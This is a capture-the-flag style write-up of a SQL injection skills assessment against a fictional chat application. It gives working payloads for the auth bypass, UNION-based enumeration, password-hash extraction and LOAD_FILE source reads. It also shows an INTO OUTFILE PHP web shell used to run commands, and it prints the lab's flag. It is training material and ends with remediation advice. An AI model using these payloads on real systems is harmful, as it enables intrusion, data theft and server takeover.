# SQL Injection Fundamentals — Skills Assessment (chattr GmbH)

## Overview

We were engaged to perform a penetration test against **chattr GmbH**. The only information provided was an IP address, and the objective was clear: assess the application for **SQL injection vulnerabilities** and demonstrate their impact end-to-end.

This assessment walks through the full attack chain — from bypassing a registration control, to authenticated SQL injection, database enumeration, source-code disclosure via file read, and finally remote code execution through a written web shell.

**Target:** `154.57.164.68:31382`

---

## Step 1 — Initial Recon & Registration Bypass

Browsing to the target, we land on a login page for an application called **chattr**.

<img width="1821" height="870" alt="loginpage" src="https://github.com/user-attachments/assets/efe7d311-211b-4821-beff-9bf5b60526ea" />


After testing a number of payloads against the login form, it appeared reasonably solid. Rather than force it, we pivoted to the **register** page, which presents a standard account-creation form — including an **invitation code** field.
<img width="1873" height="882" alt="registerpage" src="https://github.com/user-attachments/assets/98a086e7-9bb8-4e00-b819-936d1c5b01fb" />


Attempting to register normally failed: the invitation code was rejected as invalid. To bypass this check, we re-submitted the form while intercepting the POST request with **Burp Suite** (via FoxyProxy), and modified the `invitationCode` parameter in the request body to include a SQL injection payload:

```
username=tester&password=Tester1234%21&repeatPassword=Tester1234%21&invitationCode=ssss-cccc-7777' or '1'='1
```

The injected `' or '1'='1` subverted the invitation-code validation query, and the account was created successfully.

<img width="1430" height="883" alt="sqlbypass" src="https://github.com/user-attachments/assets/e56a973c-5ed9-47e9-b346-9d672d349276" />


---

## Step 2 — Finding the Injection Point

Once authenticated, we tested the various input fields. The **search-in-conversation** box (top right) proved vulnerable: submitting `'admin` returned no results and broke the expected behaviour, confirming that this parameter was injectable.

<img width="1918" height="720" alt="loggedinpage" src="https://github.com/user-attachments/assets/5a5b693b-778f-46fd-88d1-9d3c90ac0ad2" />


---

## Step 3 — Determining the Number of Columns

We used `ORDER BY` to count the columns in the underlying query, incrementing until an error occurred:

```sql
admin') ORDER BY 1-- -
admin') ORDER BY 2-- -
admin') ORDER BY 3-- -
admin') ORDER BY 4-- -      works
admin') ORDER BY 5-- -      error → 4 columns
```

> Note the `')` prefix — the backend query wrapped the input in parentheses, so we had to close both the string and the parenthesis before appending our clause.

The query has **4 columns**.

---

## Step 4 — Identifying the Visible Column

Next, we injected a UNION with numeric markers to see which column is reflected on the page:

```sql
admin') union select 1,2,3,4-- -
```

The **third column** was displayed back to us.

<img width="1898" height="787" alt="discoveredthirdcolumn" src="https://github.com/user-attachments/assets/77eb671f-5851-4f2f-a3fa-700f900d8dcc" />


Knowing the visible column is essential — every piece of data we want to extract from here on gets placed in position 3.

---

## Step 5 — Database Enumeration

**Current database name:**

```sql
admin') union select 1,2,database(),4-- -
```

The database is named `chattr`.

**Tables in the `chattr` database:**

```sql
admin') union select 1,2,TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
```

Among the results, a `Users` table stood out as worth investigating.

<img width="1918" height="702" alt="tabenumeration" src="https://github.com/user-attachments/assets/b0af2f29-204b-4b07-9fa5-e4121f2f0d57" />


**Columns in the `Users` table:**

```sql
admin') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```

This revealed several columns, including the one we cared about: `Password`.

<img width="1917" height="791" alt="discoveredcolumns" src="https://github.com/user-attachments/assets/fa605364-a233-4d17-a6f5-ca229e869a76" />


---

## Step 6 — Extracting the Admin Hash

With the table and column names known, we extracted the admin password hash:

```sql
admin') union select 1,2,Password,4 from Users where Username="admin"-- -
```

An Argon2 hash was returned.
<img width="1918" height="402" alt="discoveredadminhash" src="https://github.com/user-attachments/assets/47667623-df88-4cba-8e88-796081370e08" />


---

## Step 7 — Locating the Web Root

The second objective was to identify the application's web root. Visiting a non-existent page revealed the application runs on **nginx**. We confirmed the host with a file read:

```sql
admin') union select 1,2,LOAD_FILE('/etc/hostname'),4-- -
```

Output:
```
ng-2516694-sqlichattr-et78r-84996747f-8t48c
```

We then began probing paths under `/var/www/` until we successfully read the application's source:

```sql
cn') union select 1,2,LOAD_FILE('/var/www/chattr-prod/index.php'),4-- -
```

The query returned the PHP source of the page, confirming the web root at **`/var/www/chattr-prod/`**.

<img width="1918" height="772" alt="validatingwebroot" src="https://github.com/user-attachments/assets/31db5e47-a4d1-4da4-95a4-5e14d3e297bf" />


> This could also be automated with directory fuzzing (ffuf), but in this case the logical path-guessing approach was quick and effective.

---

## Step 8 — Writing a Web Shell (RCE)

The final objective was to plant a web shell. First, we checked the DBMS version:

```sql
cn') union select 1,2,@@version,4-- -
```

Version: `10.11.11-MariaDB-0+deb12u1`.

Then we verified the `secure_file_priv` setting — file writes are only possible if it's empty:

```sql
cn') union select 1,2,variable_value,4 from information_schema.global_variables where variable_name = "secure_file_priv"-- -
```

The result was **empty** — meaning we can write files anywhere. 

We wrote a PHP web shell into the web root using `INTO OUTFILE`:

```sql
cn') union select "",'<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/www/chattr-prod/shell.php'-- -
```

Confirming code execution:

```
https://154.57.164.68:31382/shell.php?0=id
```

<img width="1167" height="397" alt="webshell" src="https://github.com/user-attachments/assets/7b5eb0af-8b42-4d3f-b600-5740640747a9" />


The shell ran as `www-data`, confirming full command execution on the server.

---

## Step 9 — Capturing the Flag

Using the web shell, we located and read the flag:

```
https://154.57.164.68:31382/shell.php?0=find / -name "flag*" 2>/dev/null
https://154.57.164.68:31382/shell.php?0=cat /flag_876a4c.txt
```

<img width="836" height="243" alt="final flag" src="https://github.com/user-attachments/assets/bc2c2e0c-0f14-437f-9a6c-3872ef51e94c" />

```
061b1aeb94dec6bf5d9c27032b3c1d8d
```

---

## Attack Chain Summary

```
Registration bypass  →  ' or '1'='1  in invitationCode
Injection point      →  search box ('admin breaks the query)
Column count         →  ORDER BY → 4 columns
Visible column       →  UNION SELECT 1,2,3,4 → column 3
Enumeration          →  database() → chattr → Users → Password
Data extraction      →  admin Argon2 hash
File read            →  LOAD_FILE → source disclosure → web root
File write           →  INTO OUTFILE → shell.php
RCE                  →  shell.php?0=cat /flag_876a4c.txt → FLAG
```

## Remediation

- Use **parameterized queries / prepared statements** for every database interaction — this alone would have closed every injection point above.
- Enforce **least privilege** on the database account: the web application should never run as a user with `FILE` privileges.
- Set **`secure_file_priv`** to a restricted directory (or disable file operations entirely) to prevent `LOAD_FILE` and `INTO OUTFILE` abuse.
- Validate and sanitise all user input server-side, including hidden/secondary fields like invitation codes.
